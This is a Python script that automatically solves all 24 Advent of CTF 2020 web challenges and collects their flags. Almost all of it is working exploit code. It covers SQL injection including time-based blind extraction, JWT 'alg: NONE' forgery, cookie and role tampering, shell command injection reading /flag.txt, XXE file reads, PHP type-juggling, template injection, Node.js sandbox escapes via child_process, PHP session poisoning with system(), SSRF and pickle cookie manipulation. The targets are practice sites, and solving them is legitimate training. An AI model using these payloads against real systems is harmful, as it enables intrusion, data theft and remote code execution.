#!/usr/bin/env python3
"""
author:     Mohammed EL BEGHDADI
twitter:    @m0hamm3dx00

"""
import string
import requests as req
import re
from base64 import b64encode, b64decode
import urllib
import time
import json
import _pickle as cPickle
from websocket import create_connection
import subprocess
import html
import hashlib


def b64Decode(data):
    """ data: ASCII byte string
        returns: padded decoded byte string.
    """
    missing_padding = 4 - len(data) % 4
    if missing_padding:
        data += '=' * missing_padding
    return b64decode(data)


def flagAppend (flagId, flag, t):
    global CTF2020
    # CTF2020.append({flagName: flag.ljust(50), 'time(s)': float("{:0>7.4f}".format(t))})
    CTF2020.append({'id': flagId, 'flag':flag, 'time(s)': float("{:0>7.4f}".format(t))})


timeCTF = time.time()
CTF2020 = []

hdrs = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}

# day00 - teaser:
st = time.time()
url = "https://web.archive.org/web/20201112020839/https://www.adventofctf.com/"
resp = req.get(url, headers=hdrs).content.decode()
s = "Ceasar worked on this you know. (.*) -->"
# print(re.search(s,  resp))
code = re.search(s, resp).groups(1)[0]
flag = b64decode(code).decode('ascii')
flagAppend(0, flag, time.time() - st)

# day01
st = time.time()
url = "https://01.adventofctf.com/"
resp = req.get(url, headers=hdrs).content.decode()
code = re.search("<!-- This is an odd encoded thing right\? (.*) -->",  resp).groups(1)[0]
pswd = b64decode(code).decode('ascii')

#post the found password to get the flag
data = {'password': pswd}
resp = req.get(url, data, headers=hdrs)
flag = re.search("Here is a flag: (NOVI{.*})", resp.content.decode()).groups(1)[0]
flagAppend(1, flag, time.time() - st)

# day02
st = time.time()
url = "https://02.adventofctf.com/"
payload = b'{"guest": "false", "admin": "true"}'
newCookie = dict(authenticated=urllib.parse.quote(b64encode(payload)))
resp = req.get(url, cookies=newCookie, headers=hdrs)

flag = re.search("(NOVI{.*})", resp.content.decode()).groups(1)[0]
flagAppend(2, flag, time.time() - st)

# day03
st = time.time()
url = "https://03.adventofctf.com/"
username = "admin"
usernameModified = username + "-NOVI"
password = b64encode(usernameModified.encode()).decode()
q = "index.php?username=" + username + "&password=" + password
resp = req.get(url+q, headers=hdrs)
flag = re.search("(NOVI{.*})", resp.content.decode()).groups(1)[0]
flagAppend(3, flag, time.time() - st)

# day04
st = time.time()
url = "https://04.adventofctf.com/"
qry = b64encode(b'{"userid":1}').decode()
# 1075 from calculate(text)
q = "index.php?token=" + qry + ".1075"
# {"userid":1}  => eyJ1c2VyaWQiOjF9
resp = req.get(url+q, headers=hdrs)
flag = re.search("(NOVI{.*})", resp.content.decode()).groups(1)[0]
flagAppend(4, flag, time.time() - st)

# day05 SQLi
st = time.time()
url = "https://05.adventofctf.com/index.php"
data = {"username": '2', "password": "' or username like 'A%' # this is comment'"}
resp = req.post(url, data=data, headers=hdrs)
flag = re.search("(NOVI{.*})", resp.content.decode()).groups(1)[0]
flagAppend(5, flag, time.time() - st)


# day06 SQLi
st = time.time()
url = "https://06.adventofctf.com/"
sql = "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT description from flags  LIMIT 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- "
data = {"search": sql}
resp = req.post(url, data=data, headers=hdrs)
flag = re.search("(NOVI{.*})", resp.content.decode()).groups(1)[0]
flagAppend(6, flag, time.time() - st)

st = time.time()
# other way: many selects of 5 chars each time.
sql = "noextra' UNION SELECT mid(description,{},5) ,mid(description,{},5),substr(description,{},5) FROM flags #"
a, b, c = 1, 6, 11
flag = ""
while True:
    data = {"search": sql.format(a, b, c)}
    resp = req.post(url, data=data, headers=hdrs)
    # print(resp.content.decode())
    for i in (0, 1, 2):
        flg = re.search("<td>(.+)<\/td>\s+<td>(.+)<\/td>\s+<td>(.+)<\/td>\s+",
                        resp.content.decode()).groups(1)[i]
        flag += flg[:5]

    if "}" in flag:
        break
    a, b, c = a+15, b+15, c+15
flag = flag[:flag.find("}")+1]
flagAppend(6, flag, time.time() - st)

# day07 blind SQLi
st = time.time()
sleepTime = 2
url = "https://07.adventofctf.com/"
# find out username's length
sql = "' or (select if(length(username) = {}, sleep(2), 0) from naughty); # "
for l in range(4, 100):
    data = {"search": sql.format(l)}
    sTime = time.time()
    resp = req.post(url, data=data, headers=hdrs)
    if time.time() - sTime >= sleepTime:
        userLen = l
        break

alphanum = ""
for character in string.ascii_lowercase + string.digits[1:] + "-_":
    alphanum += character

# get username by brute force
sql = "' or (select if(mid(username,{},1)='{}', sleep(2), 0) from naughty); # "
rightUser = ""
i = 0
for l in range(1, userLen+1):
    for c in alphanum:
        i += 1
        data = {"search": sql.format(l, c)}
        sTime = time.time()
        resp = req.post(url, data=data, headers=hdrs)
        if time.time() - sTime >= sleepTime:
            # print("got one : " + c)
            rightUser += c
            break
        if i % 10 == 0:
            time.sleep(2)

data = {"search": rightUser}
resp = req.post(url, data=data, headers=hdrs)
if "NOVI{" in resp.content.decode():
    flag = re.search("(NOVI{.*})", resp.content.decode()).groups(1)[0]
    flagAppend(7, flag, time.time() - st)
else:
    flagAppend(7, flag, time.time() - st)


# day08
st = time.time()
url = "https://08.adventofctf.com/santa/has/many/places/to/go/"
resp = req.get(url, headers=hdrs)
flag = re.search("<p>\s*(NOVI{.*})", resp.content.decode()).groups(1)[0]
flagAppend(8, flag, time.time() - st)

# day09 JWT
st = time.time()
url = "https://09.adventofctf.com/auth"
url2 = "https://09.adventofctf.com/admin"
data = {"username": 'user', "password": 'incorrect'}
resp = req.post(url, data=data, headers=hdrs, allow_redirects=False)
if resp.status_code == 302:  # expected here
    token = req.utils.dict_from_cookiejar(resp.cookies)['token']
    jwt2 = eval(b64Decode(token.split('.')[1]).decode())
    jwt2['role'] = "admin"
    jwt2e = b64encode(json.dumps(jwt2).encode()).decode().rstrip('=')
    jwt1 = b'{"typ":"JWT","alg":"NONE"}'
    jwt1e = b64encode(jwt1).decode().rstrip('=')
    payload = jwt1e + "." + jwt2e + "."
    newCookie = dict(token=payload)
    resp = req.post(url2, cookies=newCookie, headers=hdrs)
    flag = re.search("Hey <b>Santa</b>, the flag is <b>(NOVI{.*})", resp.content.decode()).groups(1)[0]
    flagAppend(9, flag, time.time() - st)


# day10 cookie:  admin role
st = time.time()
url = "https://10.adventofctf.com/"
adminHash = hashlib.sha1("admin".encode())
payload = '{"page": "flag", "role": "' + adminHash.hexdigest() + '"}'
newCookie = dict(zeroten=urllib.parse.quote(b64encode(payload.encode())))
resp = req.get(url, cookies=newCookie, headers=hdrs)
flag = re.search("The dark secret on this page is: (NOVI{.*})", resp.content.decode()).groups(1)[0]
flagAppend(10, flag, time.time() - st)


# day11 PHP Wrappers
st = time.time()
url = "https://11.adventofctf.com/"
payload = b'{"path":"php://filter", "page":"convert.base64-encode/resource=flag" }'
newCookie = dict(zerooneone=urllib.parse.quote(b64encode(payload)))
resp = req.get(url, cookies=newCookie, headers=hdrs)
flagFileb64 = re.search('card-body">\s+([^\s]*)\s+', resp.content.decode()).groups(1)[0]
flagFile = b64decode(flagFileb64).decode('ascii')
flag = re.search("The dark secret on this page is: (NOVI{.*})", flagFile).groups(1)[0]
flagAppend(11, flag, time.time() - st)


# day12 Code execution
st = time.time()
url = "https://12.adventofctf.com/"
data = {"place": b'$(cat /flag.txt>>/dev/stderr)'}
resp = req.post(url, data, headers=hdrs)
flag = re.search("here is a flag.\n\n(NOVI{.*})", resp.content.decode()).groups(1)[0]
flagAppend(12, flag, time.time() - st)


# day13 XXE
st = time.time()
url = "https://13.adventofctf.com/"
data = '<?xml version="1.0" encoding="ISO-8859-1"?>' + "\n"
data += '<!DOCTYPE foo[ <!ELEMENT foo ANY >' + "\n"
data += '    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag.php" >]>' + "\n"
data += ' <foofoofoo> &xxe; </foofoofoo>'
resp = req.post(url, data, headers=hdrs)
resp = html.unescape(resp.content.decode())
flagFileb64 = re.search("<foofoofoo> (.*) </foofoofoo>", resp).groups(1)[0]
flagFile = b64decode(flagFileb64).decode('ascii')
flag = re.search("flag = \"(NOVI{.*})", flagFile).groups(1)[0]
flagAppend(13, flag, time.time() - st)


# day14 PHP strcomp
st = time.time()
url = "https://14.adventofctf.com/get_flag.php"
data = {"password": b'9e9999', "verifier": b'55c1943'}
resp = req.post(url, data, headers=hdrs)
flag = resp.content.decode()
flagAppend(14, flag, time.time() - st)

# day15 PHP strcomp
st = time.time()
url = "https://15.adventofctf.com/get_flag.php"
data = {"flag[]": b'd'}
resp = req.post(url, data, headers=hdrs)
flag = resp.content.decode()
flagAppend(15, flag, time.time() - st)

# day16 XOR
st = time.time()
url = "https://16.adventofctf.com/"
data = {"emoji": b"{{config}}"}
resp = req.post(url, data, headers=hdrs)
resp = html.unescape(resp.content.decode())
flag = re.search("flag': '(.*)', '", resp).groups(1)[0]
flag = 'HKQ\x1f\x7f~e|\x06{r9<\x03/3z\x12#Rr )G#*\x14,#dp=Z@AP\x0c*'
key = '112f3a99b283a4e1788dedd8e0e5d35375c33747'

def magic(flag, key):
    return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[::-1][x]) ^ ord(key[x])) for x in range(len(flag)))

flag = magic(flag.rstrip(), key)
flagAppend(16, flag.rstrip(),time.time() - st)
# CTF2020.append({flagName: flag.rstrip().ljust(50), 'time': time.time() - st})

# day17 XOR
st = time.time()
url = "https://17.adventofctf.com/"
data = {"emoji": b"{{self|attr(\"\\x5f\\x5fdict\\x5f\\x5f\")}}"}
resp = req.post(url, data, headers=hdrs)
resp = html.unescape(resp.content.decode())
### ???  I should come back to this,  having trouble with xor
if "flag': \"" in resp:
    flag = re.search("flag': \"(.*)\"}>", resp).groups(1)[0]
flag = "C\x1eS\x1dwsef}j\x057i\x7fo{D)'dO,+sutm3F"
key = '46e505c983433b7c8eefb953d3ffcd196a08bbf9'


def magic17(flag, key):
    return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[x]) ^ ord(key[::-1][x])) for x in range(len(flag)))


flag = magic17(flag, key)
flagAppend(17, flag.rstrip(), time.time() - st)

# day18
st = time.time()
url = "https://18.adventofctf.com/calc"
hdrs18 = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json; charset=utf-8',
    'Origin': 'https://18.adventofctf.com'
}
data = json.dumps({"calc": "{root.process.mainModule.require('child_process').spawnSync('cat', ['flag.txt']).stdout}"})
resp = req.post(url, data, headers=hdrs18)
flag = resp.content.decode().rstrip()
flagAppend(18, flag, time.time() - st)

# day19
st = time.time()
url = "https://19.adventofctf.com/calc"
hdrs19 = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json; charset=utf-8',
    'Origin': 'https://19.adventofctf.com'
}
data = json.dumps({"calc": "(delete(this.constructor.constructor), delete(this.constructor),  this.constructor.constructor('return process')()  .mainModule.require('child_process').execSync('cat flag.txt').toString() )"})
resp = req.post(url, data, headers=hdrs19)
flag = resp.content.decode().rstrip()
flagAppend(19, flag, time.time() - st)

# day20 
st = time.time()
url = "https://20.adventofctf.com/"
payload = {'board': [['O', 'O', 'X'], ['O', None, 'X'], [None, 'X', 'X']],
           'turn': 'O', 'finished': False, 'winner': '', 'sane': True}
tokenEncoded = b64encode(cPickle.dumps(payload)).decode('ascii')
newCookie = dict(game=tokenEncoded)
resp = req.get(url, cookies=newCookie, headers=hdrs)
flag = re.search("(NOVI{.*})", resp.content.decode()).groups(1)[0]
flagAppend(20, flag, time.time() - st)

# day21 
st = time.time()
cmd = "curl -v -d \"name=<?=system('cat /flag.txt');?>\" https://21.adventofctf.com/get_flag.php"
proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
resp = proc.communicate()
sess = re.search("PHPSESSID=(.*); path=", resp[1].decode("utf-8")).groups(1)[0]
url = "https://21.adventofctf.com/get_flag.php?function=extract&file=/tmp/sess_" + sess
resp = req.get(url, headers=hdrs)
flag = re.search("(NOVI{.*})", resp.content.decode()).groups(1)[0]
flagAppend(21, flag, time.time() - st)

# day22 SSRF
st = time.time()
url = "https://22.adventofctf.com/index.php?image=http://localhost/flag.php"
resp = req.get(url, headers=hdrs)
b64flag = re.search("jpeg;base64,(.*)\"\s", resp.content.decode()).groups(1)[0]
flag = b64decode(b64flag).decode('ascii')
flagAppend(22, flag, time.time() - st)

# day23 websockets
st = time.time()
url = "https://23.adventofctf.com"
url2 = "wss://23.adventofctf.com"

hdrs23 = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
          'Sec-WebSocket-Version': '13', 'Sec-WebSocket-Key': 'Bln1EkLuvAYEL+FXCRpdEQ==', 'Upgrade': 'websocket'}
hdrs23b = json.dumps({
    'Host': '23.adventofctf.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0 Win64 x64 rv: 85.0) Gecko/20100101 Firefox/85.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US, en;q = 0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Sec-WebSocket-Version': '13',
    'Origin': 'https://23.adventofctf.com',
    'Sec-WebSocket-Key': 'Bln1EkLuvAYEL+FXCRpdEQ==',
    'Connection': 'keep-alive, Upgrade',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Upgrade': 'websocket'
})

get = "/socket.io/?EIO=4&transport=polling&t=NQf6e0I"
resp = req.get(url + get, headers=hdrs)
sid = re.search("\"sid\":\"(.*)\",\"upgrades",resp.content.decode()).groups(1)[0]
get = "/socket.io/?EIO=4&transport=polling&t=NQf6e6b&sid=" + sid
resp = req.post(url + get, "40", headers=hdrs)
resp = req.get(url + get, headers=hdrs)
get = "/socket.io/?EIO=4&transport=websocket&sid=" + sid
resp = req.get(url + get, headers=hdrs23)
# changing to protocol 101 !
ws = create_connection(url2 + get, headers=hdrs23b)
# Perform the handshake.
ws.send("2probe")
ws.recv()
ws.send("5")
ws.recv()
data = '42["chat message",{"command":"execute","message":"' + b64encode(b".';cat /flag.txt;#").decode('ascii') + '"}]'
ws.send(data)
resp = ws.recv()
flag = re.search("(NOVI{[^}]*})", resp).groups(1)[0]
flagAppend(23, flag, time.time() - st)


# day24
st = time.time()
url = "https://24.adventofctf.com/"
game = {'board': [['O', 'O', 'X'], ['O', None, 'X'], [None, 'X', 'X']], 'turn': 'O', 'finished': False, 'winner': '', 'sane': True, 'blockchain': True,
        'chain': [{'board': [[None, None, None], [None, None, None], [None, None, 'X']], 'prev':'cef215c5be8cf63fcf3d43ecf2510b33', 'hash': 'e7dc8e1f7a6788bc0cb6841538b216e8'},
        {'board': [['O', None, None], [None, None, None], [None, None, 'X']],'prev': 'e7dc8e1f7a6788bc0cb6841538b216e8', 'hash': 'fc93236b5eea5f1d55e2b5b308d67390'},
        {'board': [['O', None, None], [None, 'X', None], [None, None, 'X']],'prev': 'fc93236b5eea5f1d55e2b5b308d67390', 'hash': 'a8dc0d3da290d1e894eaaffcb98398c9'},
        {'board': [['O', 'O', None], [None, 'X', None], [None, None, 'X']],'prev': 'a8dc0d3da290d1e894eaaffcb98398c9', 'hash': 'e74f5b22f5213ba4c2449759ce91c2aa'},
        {'board': [['O', 'O', None], [None, 'X', 'X'], [None, None, 'X']],'prev': 'e74f5b22f5213ba4c2449759ce91c2aa', 'hash': 'ef25514dffbf8247cff6063be90f2d54'},
        {'board': [['O', 'O', None], ['O', 'X', 'X'], [None, None, 'X']],'prev': 'ef25514dffbf8247cff6063be90f2d54', 'hash': 'e3a4c037bdf154b344ed9bd1643a629d'},
        {'board': [['O', 'O', None], ['O', 'X', 'X'], [None, 'X', 'X']],'prev': 'e3a4c037bdf154b344ed9bd1643a629d', 'hash': 'c240fa161737c967ece5fd94672ab0f8'},
        {'board': [['O', 'O', 'X'], ['O', None, 'X'], [None, 'X', 'X']], 'prev': 'c240fa161737c967ece5fd94672ab0f8', 'hash': '460ca8a89948050d22d312a0a65d2c49'}]}
tokenEncoded = b64encode(cPickle.dumps(game)).decode('ascii')
newCookie = dict(game=tokenEncoded)
resp = req.get(url, cookies=newCookie, headers=hdrs)
flag = re.search("(NOVI{.*})", resp.content.decode()).groups(1)[0]
flagAppend(24, flag, time.time() - st)


for flag in CTF2020:
    print(flag)
    
print(" ------ all 24 flags took {} seconds to find ----".format(time.time() - timeCTF))
